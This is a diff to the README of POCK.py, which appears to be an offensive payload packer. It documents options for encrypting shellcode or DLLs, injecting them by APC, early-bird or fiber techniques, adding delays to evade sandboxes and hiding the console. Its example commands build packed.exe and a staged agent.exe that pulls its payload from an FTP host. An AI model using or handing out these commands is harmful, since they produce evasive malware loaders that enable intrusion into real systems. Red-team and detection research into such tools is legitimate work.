@@ -57,58 +57,62 @@ python3 POCK.py -i <input_file> -o <output_file> -e <encryption> -k <key> -t <pa
 
 ---
 
-###Required Arguments
+**### Required Arguments**
 
--i, --input
+**-i, --input**  
+**Path to raw shellcode (.bin) or DLL (.dll) file**
 
-##Path to raw shellcode (.bin) or DLL (.dll) file
+**-o, --output**  
+**Name of the compiled output executable**
 
--o, --output
+**-e, --encryption**  
+**Encryption method to use: aes or xor**
 
-##Name of the compiled output executable
+**-k, --key**  
+**Key to encrypt the payload**
 
--e, --encryption
-##Encryption method to use: aes or xor
+**-t, --type**  
+**Payload type: shellcode or dll**
 
--k, --key
-##Key to encrypt the payload
+---
 
--t, --type
-##Payload type: shellcode or dll
+**### Optional Arguments**
 
-###Optional Arguments
---inject <method>
-##Injection method: apc, earlybird, fiber
+**--inject <method>**  
+**Injection method: apc, earlybird, fiber**
 
---url <ftp_url>
-##FTP URL for remote payload staging
+**--url <ftp_url>**  
+**FTP URL for remote payload staging**
 
---ftp-user <username>
-##FTP username for authentication
+**--ftp-user <username>**  
+**FTP username for authentication**
 
---ftp-pass <password>
-##FTP password for authentication
+**--ftp-pass <password>**  
+**FTP password for authentication**
 
---entropy
-##Add entropy-based execution delay
+**--entropy**  
+**Add entropy-based execution delay**
 
---fibonacci
-##Add Fibonacci loop delay
+**--fibonacci**  
+**Add Fibonacci loop delay**
 
---factorial
-##Add factorial computation delay
+**--factorial**  
+**Add factorial computation delay**
 
---sleep <seconds>
-##Sleep for specified seconds before executing
+**--sleep <seconds>**  
+**Sleep for specified seconds before executing**
 
---hide
-##Compile stub as a hidden (GUI) executable instead of console
+**--hide**  
+**Compile stub as a hidden (GUI) executable instead of console**
 
-##Example Commands
+---
+
+**## Example Commands**
+
 ```bash
-Generating an embedded payload
+# Generating an embedded payload
 python3 POCK.py -i payload.bin -o packed.exe -e aes -k <AES Key> -t shellcode --inject apc --entropy --fibonacci --sleep 15 --hide
 
-Generating a staged stub
+# Generating a staged stub
 python3 POCK.py -i beacon.dll -o agent.exe -e xor -k RedTeamFTW -t dll --url ftp://192.168.50.219/payload.bin --ftp-user user --ftp-pass pass --inject fiber --hide
-```
+
